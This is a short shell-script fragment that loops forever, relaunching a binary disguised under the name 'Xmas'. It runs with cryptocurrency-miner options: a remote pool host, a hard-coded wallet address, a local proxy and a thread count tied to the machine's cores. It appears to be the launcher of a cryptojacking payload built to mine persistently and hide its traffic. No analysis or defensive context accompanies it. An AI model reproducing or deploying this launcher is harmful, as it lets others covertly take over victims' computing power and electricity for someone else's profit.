...
while true
do
./Xmas --donate-level 1 -o supportsuperman.teatspray.uk:9655 -u solo:ar3fHmE8BgygWkkYWfdm3fbcGrxkm3rTPZrE6NPAgmkFgE8sszAjkTnSugw1WGeXbcRkaBBMSdW9yBy1g8czL7K22AaBhpw5K --rig-id=$currentdate -p $currentdate -a rx/arq -k --proxy=127.0.0.1:1081 -t $used_num_of_cores
sleep 10
done
